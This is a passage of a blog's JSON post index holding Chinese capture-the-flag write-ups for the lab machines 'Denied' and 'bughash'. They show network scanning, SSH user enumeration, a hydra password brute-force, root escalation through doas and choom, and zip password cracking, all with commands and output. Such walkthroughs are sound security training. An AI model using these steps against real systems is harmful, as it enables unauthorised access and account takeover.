src='https://7r1UMPHK.github.io/plugins/lightbox.js'></script><script src='https://7r1UMPHK.github.io/plugins/LazyLoadImages.js'></script>", "head": "", "ogImage": "https://7r1umphk.github.io/image/20250716100121947.webp", "createdDate": "2025-06-27", "dateLabelColor": "#0969da"}, "P30": {"htmlDir": "docs/post/vulnyx_Denied.html", "labels": ["vulnyx"], "postTitle": "vulnyx_Denied", "postUrl": "post/vulnyx_Denied.html", "postSourceUrl": "https://github.com/7r1UMPHK/7r1UMPHK.github.io/issues/30", "commentNum": 0, "wordCount": 8142, "description": "# 1. \u4fe1\u606f\u6536\u96c6 - \u76ee\u6807\u9501\u5b9a\uff01\n\n![image-20250519113211432](https://7r1umphk.github.io/image/20250519113211569.webp)\n\n\u8fd9\u9776\u673a\u7eaf\u590d\u73b0\uff0c\u56e0\u4e3a\u6211\u90fd\u77e5\u9053\u5b83\u53e3\u5728\u54ea\u4e86\u3002\u4e0d\u8fc7\uff0c\u6d41\u7a0b\u8fd8\u662f\u8981\u8d70\u4e00\u904d\u7684\u561b\uff01\n\n### 1. \u4fe1\u606f\u6536\u96c6 - \u76ee\u6807\u9501\u5b9a\uff01\n\n\u8001\u4e00\u5957\uff0c\u5148\u7528 `arp-scan` \u770b\u770b\u5185\u7f51\u91cc\u8c01\u662f\u76ee\u6807\u3002\n\n```bash\n\u250c\u2500\u2500(kali\u327fkali)-[/mnt/hgfs/gx]\n\u2514\u2500$ sudo arp-scan -l        \n[sudo] password for kali: \nInterface: eth0, type: EN10MB, MAC: 00:0c:29:af:40:3a, IPv4: 192.168.205.206\nStarting arp-scan 1.10.0 with 256 hosts (https://github.com/royhills/arp-scan)\n192.168.205.1   00:50:56:c0:00:08       VMware, Inc.\n192.168.205.2   00:50:56:f4:ef:6f       VMware, Inc.\n192.168.205.217 08:00:27:63:80:7c       PCS Systemtechnik GmbH # <--- \u5c31\u662f\u4f60\u4e86\uff01\n192.168.205.254 00:50:56:ed:bd:56       VMware, Inc.\n\n4 packets received by filter, 0 packets dropped by kernel\nEnding arp-scan 1.10.0: 256 hosts scanned in 1.975 seconds (129.62 hosts/sec). 4 responded\n```\nIP\u5730\u5740 `192.168.205.217` \u5230\u624b\uff0c\u63a5\u7740 `nmap` \u5927\u6cd5\u4f3a\u5019\uff0c\u770b\u770b\u5f00\u4e86\u4e9b\u5565\u7aef\u53e3\uff0c\u8dd1\u4e86\u5565\u670d\u52a1\u3002\n\n```bash\n\u250c\u2500\u2500(kali\u327fkali)-[/mnt/hgfs/gx]\n\u2514\u2500$ nmap -p22,80,8080 -sV 192.168.205.217\nStarting Nmap 7.95 ( https://nmap.org ) at 2025-05-18 23:33 EDT\nNmap scan report for denied.nyx (192.168.205.217)\nHost is up (0.00036s latency).\n\nPORT     STATE SERVICE VERSION\n22/tcp   open  ssh     OpenSSH 9.2p1 Debian 2+deb12u6 (protocol 2.0)\n80/tcp   open  http    Apache httpd 2.4.62 ((Debian))\n8080/tcp open  http    Apache httpd 2.4.62 ((Debian))\nMAC Address: 08:00:27:63:80:7C (PCS Systemtechnik/Oracle VirtualBox virtual NIC)\nService Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel\n\nService detection performed. Please report any incorrect results at https://nmap.org/submit/ .\nNmap done: 1 IP address (1 host up) scanned in 6.44 seconds\n```\n\u5f00\u4e86 22 (SSH), 80 (HTTP), \u8fd8\u6709\u4e2a 8080 (\u4e5f\u662fHTTP)\u3002\u90fd\u662f Apache 2.4.62\uff0cSSH \u7248\u672c\u662f OpenSSH 9.2p1\u3002\n\n### 2. Web \u670d\u52a1\u63a2\u6d4b - Apache \u6b22\u8fce\u60a8\uff01\n\n\u5148 `curl` \u4e00\u4e0b 80 \u548c 8080 \u7aef\u53e3\u770b\u770b\u3002\u4e24\u4e2a\u7aef\u53e3\u90fd\u662f Apache \u7684\u9ed8\u8ba4\u6b22\u8fce\u9875\u9762\uff0c\u4e00\u6a21\u4e00\u6837\u3002\u770b\u6765\u6ca1\u5565\u7279\u522b\u7684\u4e1c\u897f\u3002\n\u63a5\u7740\u4e0a\u76ee\u5f55\u7206\u7834\uff0c\u7528 `gobuster` \u626b\u4e86\u4e00\u5708\uff0c\u6362\u4e86\u597d\u51e0\u4e2a\u5b57\u5178\uff0c\u5305\u62ec `directory-list-2.3-medium.txt`, `directory-list-2.3-big.txt`\uff0c\u751a\u81f3\u6211\u81ea\u5df1\u6539\u7684\u5012\u5e8f `hbig.txt`\uff0c\u8fd8\u8bd5\u4e86\u5404\u79cd\u5e38\u89c1\u7684\u6269\u5c55\u540d\u3002\n\n```bash\ngobuster dir -u http://192.168.205.217:80 -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt  -x php,txt,html,zip \ngobuster dir -u http://192.168.205.217:8080 -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt  -x php,txt,html,zip \ngobuster dir -u http://192.168.205.217:80 -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-big.txt  -x php,txt,html,zip \ngobuster dir -u http://192.168.205.217:8080 -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-big.txt  -x php,txt,html,zip # Note: Log had 80, but context implies 8080\ngobuster dir -u http://192.168.205.217:8080 -w /usr/share/wordlists/seclists/Discovery/Web-Content/hbig.txt -x php,txt,html,zip,bak,old,conf,cgi,sh,log,.htaccess\n```\n\u7ed3\u679c\u662f...\u5565\u4e5f\u6ca1\u626b\u51fa\u6765\u3002Web \u8fd9\u8fb9\u770b\u6765\u662f\u6761\u6b7b\u80e1\u540c\u3002\u8fd8\u8bd5\u4e86\u4e0bDNS\u5b50\u57df\u540d\u7206\u7834\uff0c\u4e5f\u6ca1\u5565\u53d1\u73b0\u3002\n\n```bash\ngobuster dns -d http://disguise.hmv/ -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt\n```\n\n### 3. SSH \u7a81\u7834 - \u7528\u6237\u540d\u679a\u4e3e\u4e0e\u7206\u7834\n\nWeb \u6ca1\u620f\uff0c\u90a3\u5c31\u53ea\u80fd\u4ece SSH \u4e0b\u624b\u4e86\u3002\u5148\u8bd5\u8bd5 `root` \u7528\u6237\u3002\n\n```bash\n\u250c\u2500\u2500(kali\u327fkali)-[/mnt/hgfs/gx]\n\u2514\u2500$ ssh root@192.168.205.217\nroot@192.168.205.217: Permission denied (publickey).\n```\n\u63d0\u793a `Permission denied (publickey)`\uff0c\u770b\u6765 `root` \u7528\u6237\u662f\u7981\u6b62\u5bc6\u7801\u767b\u5f55\uff0c\u5f3a\u5236\u7528\u5bc6\u94a5\u3002\n\n\u8fd9\u65f6\u5019\u6211\u60f3\u8d77\u4e86\u6628\u5929\u770b\u5230\u7684 ll04567 \u5927\u4f6c\u7684\u601d\u8def...\n![image-20250519113954961](https://7r1umphk.github.io/image/20250519113955108.webp)\n\u5bb3\uff0c\u6628\u5929\u4e3a\u4ec0\u4e48\u8981\u770b\u5230\uff0c\u6ca1\u770b\u5230\u5c31\u53ef\u4ee5\u81ea\u5df1\u6478\u7d22\u4e00\u4e0b\u4e86\u3002\u65e2\u7136\u662f\u590d\u73b0\uff0c\u90a3\u5c31\u6309\u8fd9\u4e2a\u601d\u8def\u8d70\u3002\n\u5927\u4f6c\u7684\u601d\u8def\u662f\u5b58\u5728\u4e00\u4e2a\u53ef\u4ee5\u5bc6\u7801\u767b\u5f55\u7684\u666e\u901a\u7528\u6237\u3002\u7528 `seclists` \u91cc\u7684\u7528\u6237\u540d\u5b57\u5178\u5c1d\u8bd5\u679a\u4e3e\u4e00\u4e0b\uff1a\n\n```bash\n\u250c\u2500\u2500(kali\u327fkali)-[/mnt/hgfs/gx]\n\u2514\u2500$ for i in $(cat /usr/share/seclists/Usernames/Names/names.txt);do ssh $i@192.168.205.217 ;done\n# ... (\u5927\u91cf\u5c1d\u8bd5) ...\nakira@192.168.205.217's password: \n```\n(\u8fd9\u91cc\u624b\u52a8 `Ctrl+C` \u505c\u6b62\u679a\u4e3e)\n\u679a\u4e3e\u5230\u7528\u6237 `akira` \u7684\u65f6\u5019\uff0cSSH \u5ba2\u6237\u7aef\u63d0\u793a\u8f93\u5165\u5bc6\u7801\uff0c\u800c\u4e0d\u662f\u50cf\u5176\u4ed6\u7528\u6237\u90a3\u6837\u76f4\u63a5 `Permission denied (publickey)`\u3002\u8fd9\u8bf4\u660e `akira` \u7528\u6237\u5b58\u5728\uff0c\u5e76\u4e14\u5141\u8bb8\u5bc6\u7801\u767b\u5f55\uff01\n\n\u627e\u5230\u7528\u6237\u540d `akira`\uff0c\u63a5\u4e0b\u6765\u5c31\u662f\u796d\u51fa `hydra` \u5927\u6cd5\u7206\u7834\u5bc6\u7801\u4e86\u3002\u7528\u4e86\u4e00\u4e2a\u5e38\u7528\u7684\u5bc6\u7801\u5b57\u5178 `5000q.txt`\u3002\n\n```bash\n\u250c\u2500\u2500(kali\u327fkali)-[/mnt/hgfs/gx]\n\u2514\u2500$ hydra -l akira -P 5000q.txt ssh://192.168.205.217 -V -I          \nHydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).\n\nHydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2025-05-18 23:41:21\n[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4\n[WARNING] Restorefile (ignored ...) from a previous session found, to prevent overwriting, ./hydra.restore\n[DATA] max 16 tasks per 1 server, overall 16 tasks, 5000 login tries (l:1/p:5000), ~313 tries per task\n[DATA] attacking ssh://192.168.205.217:22/\n[ATTEMPT] target 192.168.205.217 - login 'akira' - pass '123456' - 1 of 5000 [child 0] (0/0)\n# ... (\u5927\u91cf\u5c1d\u8bd5\u8f93\u51fa) ...\n[ATTEMPT] target 192.168.205.217 - login 'akira' - pass 'shakira' - 568 of 5003 [child 7] (0/3)\n[22][ssh] host: 192.168.205.217   login: akira   password: shakira\n^C                                                                                                                                                                                   \n```\nBingo! `hydra` \u6210\u529f\u7206\u51fa\u5bc6\u7801 `akira:shakira`\u3002\n\n\u8d76\u7d27\u767b\u5f55\uff01\n```bash\n\u250c\u2500\u2500(kali\u327fkali)-[/mnt/hgfs/gx]\n\u2514\u2500$ ssh akira@192.168.205.217 \nakira@192.168.205.217's password: shakira\nakira@denied:~$ id\nuid=1000(akira) gid=1000(akira) grupos=1000(akira)\n```\n\u6210\u529f\u4ee5 `akira` \u7528\u6237\u767b\u5f55\u7cfb\u7edf\uff01\n\n### 4. \u6743\u9650\u63d0\u5347 - akira -> root\n\n\u62ff\u5230 `akira` \u7684 shell\uff0c\u5148\u770b\u770b\u5bb6\u76ee\u5f55\u6709\u5565\uff0c\u987a\u4fbf\u628a `user.txt` \u8bfb\u4e86\u3002\n\n```bash\nakira@denied:~$ ls -la\ntotal 28\ndrwx------ 3 akira akira 4096 may 18 13:03 .\ndrwxr-xr-x 3 root  root  4096 may 18 11:25 ..\nlrwxrwxrwx 1 root  root     9 nov 15  2023 .bash_history -> /dev/null\n-rw-r--r-- 1 akira akira  220 nov 15  2023 .bash_logout\n-rw-r--r-- 1 akira akira 3526 nov 15  2023 .bashrc\ndrwxr-xr-x 3 akira akira 4096 may 18 11:41 .local\n-rw-r--r-- 1 akira akira  807 nov 15  2023 .profile\n-r-------- 1 akira akira   33 may 18 11:41 user.txt\nakira@denied:~$ cat user.txt \n6acfb2803973dacc95152a873ba79255\n```\nUser flag\u5230\u624b\uff01\u63a5\u4e0b\u6765\u770b\u770b\u80fd\u4e0d\u80fd\u63d0\u6743\u5230 `root`\u3002\n\u5148\u8bd5\u8bd5 `sudo -l`\uff1a\n```bash\nakira@denied:~$ sudo -l\n-bash: sudo: orden no encontrada\n```\n\u201corden no encontrada\u201d\uff0c\u897f\u73ed\u7259\u8bed\u7684 \u201ccommand not found\u201d\u3002\u770b\u6765\u7cfb\u7edf\u91cc\u6ca1\u6709 `sudo`\uff0c\u6216\u8005 `akira` \u7528\u6237\u7684 `PATH` \u6ca1\u914d\u597d\u3002\n\n\u90a3\u5c31\u627e\u627e\u6709\u6ca1\u6709 SUID \u7a0b\u5e8f\u53ef\u4ee5\u5229\u7528\u3002\n```bash\nakira@denied:~$ find / -perm -4000 -type f 2>/dev/null\n/usr/bin/mount\n/usr/bin/chsh\n/usr/bin/doas  # <--- \u8fd9\u4e2a\u770b\u8d77\u6765\u4e0d\u4e00\u822c\uff01\n/usr/bin/passwd\n/usr/bin/su\n/usr/bin/gpasswd\n/usr/bin/chfn\n/usr/bin/umount\n/usr/bin/newgrp\n/usr/lib/dbus-1.0/dbus-daemon-launch-helper\n/usr/lib/openssh/ssh-keysign\n```\n\u53d1\u73b0\u4e86\u4e00\u4e2a `/usr/bin/doas`\uff0c\u8fd9\u73a9\u610f\u513f\u662f `sudo` \u7684\u4e00\u4e2a\u8f7b\u91cf\u7ea7\u66ff\u4ee3\u54c1\u3002\u6709\u620f\uff01\n\u770b\u770b `doas` \u80fd\u4e0d\u80fd\u76f4\u63a5\u7528\uff1a\n```bash\nakira@denied:/opt$ /usr/bin/doas -h\n/usr/bin/doas: invalid option -- 'h'\nusage: doas [-Lns] [-C config] [-u user] command [args]\nakira@denied:/opt$ /usr/bin/doas -u root bash\ndoas: Operation not permitted\n```\n\u76f4\u63a5\u7528 `doas -u root bash` \u63d0\u793a \u201cOperation not permitted\u201d\u3002\u770b\u6765 `akira` \u7528\u6237\u4e0d\u80fd\u968f\u4fbf\u7528 `doas` \u6267\u884c\u6240\u6709\u547d\u4ee4\u3002\n\u90a3\u5b83\u5230\u5e95\u80fd\u7528 `doas` \u6267\u884c\u5565\u5462\uff1f\u5f97\u60f3\u529e\u6cd5\u679a\u4e3e\u4e00\u4e0b `/etc/doas.conf`\u6216\u8005\u66b4\u529b\u6d4b\u8bd5 `/usr/bin` \u4e0b\u7684\u547d\u4ee4\u3002\u7ed3\u679c\u53d1\u73b0`/etc/doas.conf`\u4e0d\u7ed9\u770b\uff0c\u90a3\u5c31\u53ea\u53ef\u4ee5\u66b4\u529b\u6d4b\u8bd5\n\u6839\u636e\u65e5\u5fd7\uff0c\u662f\u901a\u8fc7\u904d\u5386\u6d4b\u8bd5\u53d1\u73b0 `/usr/bin/choom` \u53ef\u4ee5\u7528 `doas` \u6267\u884c\uff1a\n\n```bash\nakira@denied:/opt$ for i in $(ls /usr/bin); do doas -u root /usr/bin/$i 2>&1 | grep -v 'doas: Operation not permitted';done\nchoom: no se ha especificado ni PID ni ORDEN\nEscriba 'choom --help' para obtener m\u00e1s informaci\u00f3n.\nakira@denied:/opt$ /usr/bin/doas -u root /usr/bin/choom --help\n\nModo de empleo:\n choom [opciones] -p pid\n choom [opciones] -n n\u00famero -p pid\n choom [opciones] -n n\u00famero [--] orden [args...]]  # <--- \u5173\u952e\u5728\u8fd9\uff01\n\nMuestra y ajusta la puntuaci\u00f3n de matador OOM.\n\nOpciones:\n -n, --adjust <num>     especifica el valor de ajuste de puntuaci\u00f3n\n -p, --pid <num>        ID de proceso\n\n -h, --help             muestra esta ayuda\n -V, --version          muestra la versi\u00f3n\n```\n`choom` \u7684\u5e2e\u52a9\u4fe1\u606f\u91cc\u5199\u7740\u53ef\u4ee5\u7528 `-n <n\u00famero> [--] orden [args...]` \u7684\u65b9\u5f0f\u6765\u6267\u884c\u4e00\u4e2a\u547d\u4ee4\uff01\u65e2\u7136 `doas` \u5141\u8bb8 `akira` \u4ee5 `root` \u6743\u9650\u6267\u884c `choom`\uff0c\u90a3\u6211\u4eec\u5c31\u53ef\u4ee5\u901a\u8fc7 `choom` \u6765\u95f4\u63a5\u4ee5 `root` \u6743\u9650\u6267\u884c\u4efb\u610f\u547d\u4ee4\u4e86\uff01\n\n\u5229\u7528\u8fd9\u4e2a\u7279\u6027\uff0c\u8ba9 `choom` \u6267\u884c `/bin/bash -p` (`-p` \u53c2\u6570\u662f\u4e3a\u4e86\u8ba9 bash \u4fdd\u6301\u6709\u6548\u7528\u6237ID\u4e3a root)\u3002\n```bash\nakira@denied:/opt$ /usr/bin/doas -u root /usr/bin/choom -n -1000-p 0 bash\nroot@denied:/opt# id\nuid=0(root) gid=0(root) grupos=0(root)\n```\nBoom! `uid=0(root)`\uff0c\u6210\u529f\u62ff\u5230 root \u6743\u9650\uff01\n\n### 5. \u6536\u83b7 Root Flag\n\n\u62ff\u5230 root shell\uff0c\u6700\u540e\u4e00\u6b65\u5f53\u7136\u662f\u8bfb\u53d6 `/root/root.txt`\u3002\n```bash\nroot@denied:/opt# cat /root/root.txt \nea2118e462426513a247964eb8320c27\n```\nRoot flag\u5230\u624b\uff01Denied \u9776\u673a\uff0c\u5352\uff01\nsentence", "top": 0, "createdAt": 1751016562, "style": "", "script": "</script><script src='https://7r1UMPHK.github.io/plugins/TOC.js'></script><script src='https://7r1UMPHK.github.io/plugins/lightbox.js'></script><script src='https://7r1UMPHK.github.io/plugins/LazyLoadImages.js'></script>", "head": "", "ogImage": "https://7r1umphk.github.io/image/20250716100121947.webp", "createdDate": "2025-06-27", "dateLabelColor": "#0969da"}, "P32": {"htmlDir": "docs/post/nei-bu-_bughash.html", "labels": ["\u5185\u90e8\u9776\u673a/maze-sec"], "postTitle": "\u5185\u90e8_bughash", "postUrl": "post/nei-bu-_bughash.html", "postSourceUrl": "https://github.com/7r1UMPHK/7r1UMPHK.github.io/issues/32", "commentNum": 0, "wordCount": 26323, "description": "\u518d\u63a5\u518d\u5389\uff01\n\n![image-20250608114424427](https://7r1umphk.github.io/image/20250608114424653.webp)\n\n\u770b\u9776\u673aip\n\n```\n\u250c\u2500\u2500(kali\u327fkali)-[/mnt/hgfs/gx]\n\u2514\u2500$ sudo arp-scan -l\n[sudo] password for kali: \nInterface: eth0, type: EN10MB, MAC: 00:0c:29:af:40:3a, IPv4: 192.168.205.206\nStarting arp-scan 1.10.0 with 256 hosts (https://github.com/royhills/arp-scan)\n192.168.205.1   00:50:56:c0:00:08       VMware, Inc.\n192.168.205.2   00:50:56:f4:ef:6f       VMware, Inc.\n192.168.205.131 08:00:27:1f:68:e6       PCS Systemtechnik GmbH\n192.168.205.254 00:50:56:ed:18:9e       VMware, Inc.\n\n4 packets received by filter, 0 packets dropped by kernel\nEnding arp-scan 1.10.0: 256 hosts scanned in 2.180 seconds (117.43 hosts/sec). 4 responded\n                                                          \n```\n\n\u63a2\u6d4b\u670d\u52a1\n\n```\n\u250c\u2500\u2500(kali\u327fkali)-[/mnt/hgfs/gx]\n\u2514\u2500$ nmap -p22,8080 -sC -sV 192.168.205.131\nStarting Nmap 7.95 ( https://nmap.org ) at 2025-06-07 23:44 EDT\nNmap scan report for 192.168.205.131\nHost is up (0.00079s latency).\n\nPORT     STATE SERVICE VERSION\n22/tcp   open  ssh     OpenSSH 10.0 (protocol 2.0)\n8080/tcp open  http    Node.js Express framework\n|_http-title: \\xE5\\xA4\\xA7\\xE5\\x82\\xBB\\xE5\\xAD\\x90\\xE5\\xBA\\x8F\\xE5\\x88\\x97\\xE5\\x8F\\xB7\\xE9\\xAA\\x8C\\xE8\\xAF\\x81\\xE7\\xB3\\xBB\\xE7\\xBB\\x9F\n|_http-open-proxy: Proxy might be redirecting requests\n| http-robots.txt: 1 disallowed entry \n|_zip2john 2026bak.zip > ziphash\nMAC Address: 08:00:27:1F:68:E6 (PCS Systemtechnik/Oracle VirtualBox virtual NIC)\n\nService detection performed. Please report any incorrect results at https://nmap.org/submit/ .\nNmap done: 1 IP address (1 host up) scanned in 7.20 seconds\n                                                                                 \n```\n\n\u770b\u52308080\u6709\u4e2a2026bak.zip\u6587\u4ef6\uff0c\u62c9\u4e0b\u6765\n\n```\n\u250c\u2500\u2500(kali\u327fkali)-[/mnt/hgfs/gx]\n\u2514\u2500$ wget http://192.168.205.131:8080/2026bak.zip\n--2025-06-07 23:46:14--  http://192.168.205.131:8080/2026bak.zip\nConnecting to 192.168.205.131:8080... connected.\nHTTP request sent, awaiting response... 200 OK\nLength: 676250 (660K) [application/zip]\nSaving to: \u20182026bak.zip\u2019\n\n2026bak.zip                                  100%[=============================================================================================>] 660.40K  --.-KB/s    in 0.03s   \n\n2025-06-07 23:46:14 (24.1 MB/s) - \u20182026bak.zip\u2019 saved [676250/676250]\n\n                            \n```\n\n\u5c1d\u8bd5\u6253\u5f00\n\n```\n\u250c\u2500\u2500(kali\u327fkali)-[/mnt/hgfs/gx]\n\u2514\u2500$ 7z x 2026bak.zip                      \n\n7-Zip 24.09 (x64) : Copyright (c) 1999-2024 Igor Pavlov : 2024-11-29\n 64-bit locale=en_US.UTF-8 Threads:128 OPEN_MAX:1024, ASM\n\nScanning the drive for archives:\n1 file, 676250 bytes (661 KiB)\n\nExtracting archive: 2026bak.zip\n--\nPath = 2026bak.zip\nType = zip\nPhysical Size = 676250\n\n    \nEnter password (will not be echoed):\n```\n\n\u8981\u5bc6\u7801\uff0cjohn\u7206\u7834\n\n```\n\u250c\u2500\u2500(kali\u327fkali)-[/mnt/hgfs/gx]\n\u2514\u2500$ zip2john 2026bak.zip > hash\nver 2.0 2026bak.zip/2026bak/ is not encrypted, or stored with non-handled compression type\nver 2.0 2026bak.zip/2026bak/app.js PKZIP Encr: TS_chk, cmplen=550, decmplen=1189, crc=398AEF6F ts=58E6 cs=58e6 type=8\nver 2.0 2026bak.zip/2026bak/package.json PKZIP Encr: TS_chk, cmplen=188, decmplen=269, crc=B3FD1F4B ts=51B7 cs=51b7 type=8\nver 2.0 2026bak.zip/2026bak/pnpm-lock.yaml PKZIP Encr: TS_chk, cmplen=6576, decmplen=16896, crc=8A30424C ts=95C7 cs=95c7 type=8\nver 2.0 2026bak.zip/2026bak/public/ is not encrypted, or stored with non-handled compression type\nver 2.0 2026bak.zip/2026bak/public/css/ is not encrypted, or stored with non-handled compression type\nver 2.0 2026bak.zip/2026bak/public/css/all.min.css PKZIP Encr: TS_chk, cmplen=22371, decmplen=102025, crc=3F9C99C5 ts=908D cs=908d type=8\nver 2.0 2026bak.zip/2026bak/public/index.html PKZIP Encr: TS_chk, cmplen=2337, decmplen=8708, crc=BA472F2A ts=6A60 cs=6a60 type=8\nver 2.0 2026bak.zip/2026bak/public/js/ is not encrypted, or stored with non-handled compression type\nver 2.0 2026bak.zip/2026bak/public/js/index.js PKZIP Encr: TS_chk, cmplen=2140, decmplen=7773, crc=51B509C2 ts=50FC cs=50fc type=8\nver 2.0 2026bak.zip/2026bak/public/js/md5.min.js PKZIP Encr: TS_chk, cmplen=1587, decmplen=3770, crc=ABC5E899 ts=A254 cs=a254 type=8\nver 2.0 2026bak.zip/2026bak/public/js/seedrandom.min.js PKZIP Encr: TS_chk, cmplen=924, decmplen=1631, crc=A32D162A ts=9BE5 cs=9be5 type=8\nver 2.0 2026bak.zip/2026bak/public/robots.txt PKZIP Encr: TS_chk, cmplen=117, decmplen=122, crc=707883A9 ts=4D0C cs=4d0c type=8\nver 2.0 2026bak.zip/2026bak/public/webfonts/ is not encrypted, or stored with non-handled compression type\nver 2.0 2026bak.zip/2026bak/public/webfonts/fa-brands-400.ttf PKZIP Encr: TS_chk, cmplen=122902, decmplen=210792, crc=B603F717 ts=2BFC cs=2bfc type=8\nver 2.0 2026bak.zip/2026bak/public/webfonts/fa-brands-400.woff2 PKZIP Encr: TS_chk, cmplen=118720, decmplen=118680, crc=E0935466 ts=2BFC cs=2bfc type=8\nver 2.0 2026bak.zip/2026bak/public/webfonts/fa-regular-400.ttf PKZIP Encr: TS_chk, cmplen=26762, decmplen=68064, crc=8BAA11E2 ts=2BFC cs=2bfc type=8\nver 2.0 2026bak.zip/2026bak/public/webfonts/fa-regular-400.woff2 PKZIP Encr: TS_chk, cmplen=25494, decmplen=25472, crc=D76269F6 ts=2BFC cs=2bfc type=8\nver 2.0 2026bak.zip/2026bak/public/webfonts/fa-solid-900.ttf PKZIP Encr: TS_chk, cmplen=173643, decmplen=426112, crc=43F15403 ts=2BFC cs=2bfc type=8\nver 2.0 2026bak.zip/2026bak/public/webfonts/fa-solid-900.woff2 PKZIP Encr: TS_chk, cmplen=158282, decmplen=158220, crc=2F37E44A ts=2BFC cs=2bfc type=8\nver 2.0 2026bak.zip/2026bak/public/webfonts/fa-v4compatibility.ttf PKZIP Encr: TS_chk, cmplen=5048, decmplen=10836, crc=56DA8271 ts=2BFC cs=2bfc type=8\nver 2.0 2026bak.zip/2026bak/public/webfonts/fa-v4compatibility.woff2 PKZIP Encr: TS_chk, cmplen=4813, decmplen=4796, crc=D4BF5069 ts=2BFC cs=2bfc type=8\nNOTE: It is assumed that all files in each archive have the same password.\nIf that is not the case, the hash may be uncrackable. To avoid this, use\noption -o to pick a file at a time.\n                                                                                                                                                                                   \n\u250c\u2500\u2500(kali\u327fkali)-[/mnt/hgfs/gx]\n\u2514\u2500$ john --wordlist=/usr/share/wordlists/rockyou.txt hash\nUsing default input encoding: UTF-8\nLoaded 1 password hash (PKZIP [32/64])\nNo password hashes left to crack (see FAQ)\n                                                                                                                                                                                   \n\u250c\u2500\u2500(kali\u327fkali)-[/mnt/hgfs/gx]\n\u2514\u2500$ john --show hash                                     \n2026bak.zip:123456789::2026bak.zip:2026bak/public/robots.txt, 2026bak/package.json, 2026bak/app.js, 2026bak/public/js/seedrandom.min.js, 2026bak/public/js/md5.min.js, 2026bak/public/js/index.js, 2026bak/public/index.html, 2026bak/public/webfonts/fa-v4compatibility.woff2:2026bak.zip\n\n1 password hash cracked, 0 left\n               \n```\n\n123456789\u7684\u5bc6\u7801\uff0c\u89e3\u538b\n\n```\n\u250c\u2500\u2500(kali\u327fkali)-[/mnt/hgfs/gx]\n\u2514\u2500$ 7z x 2026bak.zip -p123456789          \n\n7-Zip 24.09 (x64) : Copyright (c) 1999-2024 Igor Pavlov : 2024-11-29\n 64-bit locale=en_US.UTF-8 Threads:128 OPEN_MAX:1024, ASM\n\nScanning the drive for archives:\n1 file, 676250 bytes (661 KiB)\n\nExtracting archive: 2026bak.zip\n--\nPath = 2026bak.zip\nType = zip\nPhysical Size = 676250\n\n    \nWould you like to replace the existing file:\n  Path:     ./2026bak/app.js\n  Size:     0 bytes\n  Modified: 2025-06-05 23:07:10\nwith the file from archive:\n  Path:     2026bak/app.js\n  Size:     1189 bytes (2 KiB)\n  Modified: 2025-06-05 23:07:10\n? (Y)es / (N)o / (A)lways / (S)kip all / A(u)to rename all / (Q)uit? A\n\nEverything is Ok       \n\nFolders: 5\nFiles: 17\nSize:       1165355\nCompressed: 676250\n                                           \n```\n\n\u770b\u770b\u76ee\u5f55\u7ed3\u6784\n\n```\n\u250c\u2500\u2500(kali\u327fkali)-[/mnt/hgfs/gx]\n\u2514\u2500$ cd 2026bak                   \n                \n\u250c\u2500\u2500(kali\u327fkali)-[/mnt/hgfs/gx/2026bak]\n\u2514\u2500$ tree .    \n.\n\u251c\u2500\u2500 app.js\n\u251c\u2500\u2500 package.json\n\u251c\u2500\u2500 pnpm-lock.yaml\n\u2514\u2500\u2500 public\n    \u251c\u2500\u2500 css\n    \u2502   \u2514\u2500\u2500 all.min.css\n    \u251c\u2500\u2500 index.html\n    \u251c\u2500\u2500 js\n    \u2502   \u251c\u2500\u2500 index.js\n    \u2502   \u251c\u2500\u2500 md5.min.js\n    \u2502   \u2514\u2500\u2500 seedrandom.min.js\n    \u251c\u2500\u2500 robots.txt\n    \u2514\u2500\u2500 webfonts\n        \u251c\u2500\u2500 fa-brands-400.ttf\n        \u251c\u2500\u2500 fa-brands-400.woff2\n        \u251c\u2500\u2500 fa-regular-400.ttf\n        \u251c\u2500\u2500 fa-regular-400.woff2\n        \u251c\u2500\u2500 fa-solid-900.ttf\n        \u251c\u2500\u2500 fa-solid-900.woff2\n        \u251c\u2500\u2500 fa-v4compatibility.ttf\n        \u2514\u2500\u2500 fa-v4compatibility.woff2\n\n5 directories, 17 files\n                 \n```\n\n\u5148\u770bapp.js\n\n```\n\u250c\u2500\u2500(kali\u327fkali)-[/mnt/hgfs/gx/2026bak]\n\u2514\u2500$ cat app.js                                \nconst express = require('express');\nconst path = require('path');\n\nconst app = express();\nconst port = process.env.PORT || 8080;\n\n// \u89e3\u6790 JSON \u8bf7\u6c42\u4f53\napp.use(express.json());\n\n// \u9759\u6001\u6587\u4ef6\u670d\u52a1\napp.use(express.static('public'));\n\n// /checkSN \u8def\u7531 (POST\u8bf7\u6c42)\napp.post('/checkSN', (req, res) => {\n    // \u4ece\u8bf7\u6c42\u4f53\u4e2d\u83b7\u53d6 SN \u53c2\u6570\n    const sn = req.body.sn;\n\n    if (sn) {\n        if (sn === 'xxxxxxxxxxxxxxxxxxxxxxxxx') {\n            res.json({\n                code: 200,\n                data: 'xxxxxx:XXXXX',\n                msg: 'Success: Valid SN '\n            });\n        } else {\n            res.json({\n                code: 401,\n                data: null,\n                msg: 'Error: Invalid SN'\n            });\n        }\n    } else {\n        res.status(400).json({\n            code: 400,\n            data: null,\n            msg: 'Missing sn parameter in request body'\n        });\n    }\n});\napp.use((req, res) => {\n    res.status(404).json({\n        code: 404,\n        data: null,\n        msg: '404 Not Found'\n    });\n});\n\napp.listen(port, () => {\n    console.log(`Server running at http://localhost:${port}`);\n});                                                                                                                                                                                   \n```\n\n\u89e3\u6790\u67d0\u4e9b\u5b57\u7b26\uff0c\u7136\u540e\u4ee5POST\u8bf7\u6c42\u53d1\u9001\u5230/checkSN\n\n\u7ee7\u7eed\u770b\uff0c\u770bpublic/js/index.js\n\n```\n\u250c\u2500\u2500(kali\u327fkali)-[/mnt/hgfs/gx/2026bak]\n\u2514\u2500$ cat public/js/index.js \ndocument.addEventListener('DOMContentLoaded', function () {\n    const snInput = document.getElementById('sn-input');\n    const verifyBtn = document.getElementById('verify-btn');\n    